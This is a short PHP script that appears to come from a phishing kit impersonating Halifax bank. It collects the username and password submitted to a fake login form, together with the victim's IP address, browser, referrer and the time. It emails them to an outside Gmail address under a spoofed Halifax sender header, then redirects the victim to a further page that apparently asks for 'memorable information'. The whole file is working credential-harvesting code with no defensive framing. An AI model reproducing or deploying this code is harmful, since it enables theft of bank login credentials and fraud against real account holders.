<?php
$token=$_SESSION['token'];
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$httprefi = getenv ("HTTP_REFERER");
$server=$_SERVER["HTTP_HOST"];
$browser = $_SERVER['HTTP_USER_AGENT'];
$username=$_POST['username'];
$password=$_POST['password'];
$mesaj="
$httprefi
$server
$browser
$adddate
ip: $ip
--------------
user: $username
pass: $password
";
$send="kingsama786@gmail.com"; 
$subject = "$ip";
$headers = "From: Halifax<xpp@h4l1f4x.com>";
mail($send,$subject,$mesaj,$headers);
 header( "Location: entermemorableinformation.jsp");
 
?>